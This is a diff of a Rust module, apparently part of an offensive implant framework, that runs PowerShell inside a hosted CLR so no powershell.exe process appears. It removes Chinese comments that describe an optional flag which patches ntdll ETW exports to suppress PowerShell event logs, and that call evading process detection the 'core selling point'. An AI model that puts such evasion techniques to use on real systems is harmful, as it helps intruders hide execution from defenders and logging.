@@ -1,6 +1,5 @@
 //! PowerShell cloud module — in-process execution via hosted CLR 4
 //! (no powershell.exe process, no system-DLL memory patching).
-//! 执行实现位于共享库 libra-psinline。
 #![allow(non_snake_case)]
 #![allow(clippy::upper_case_acronyms)]
 
@@ -38,9 +37,6 @@ fn dispatch(input: &str) -> String {
         .and_then(|t| t.as_u64())
         .unwrap_or(60)
         .max(1);
-    // ETW 痕迹抑制（默认关闭）：显式 etwSuppress=true 时在执行窗口内
-    // 瞬态 patch 本进程 ntdll ETW 导出，抑制 PowerShell 事件日志。
-    // 注意：patch 系统 DLL 是 EDR 行为检测高危信号，仅在确认环境后开启。
     let suppress_etw = v
         .get("etwSuppress")
         .and_then(|b| b.as_bool())
@@ -64,9 +60,6 @@ fn write_output(s: &str, output: *mut u8, output_cap: usize) -> usize {
 mod tests {
     use super::*;
 
-    /// 无进程、无补丁的 inline 链路测试。执行无害脚本验证：
-    /// 1) CLR 4 托管成功；2) GAC S.M.A. 加载成功；3) 结果经管道回传。
-    /// 本测试不触发任何 Defender 行为检测（不创建挂起进程、不改写系统 DLL）。
     #[test]
     fn inline_executes_script() {
         let out = dispatch(r#"{"script":"Write-Output 'hello-inline-42'"}"#);
@@ -92,7 +85,6 @@ mod tests {
         assert!(out.len() > 50_000, "output too small: {}", out.len());
     }
 
-    /// 核心卖点验证：inline 执行不产生任何 powershell.exe / pwsh.exe 进程。
     #[test]
     fn inline_spawns_no_powershell_process() {
         fn count_ps() -> usize {
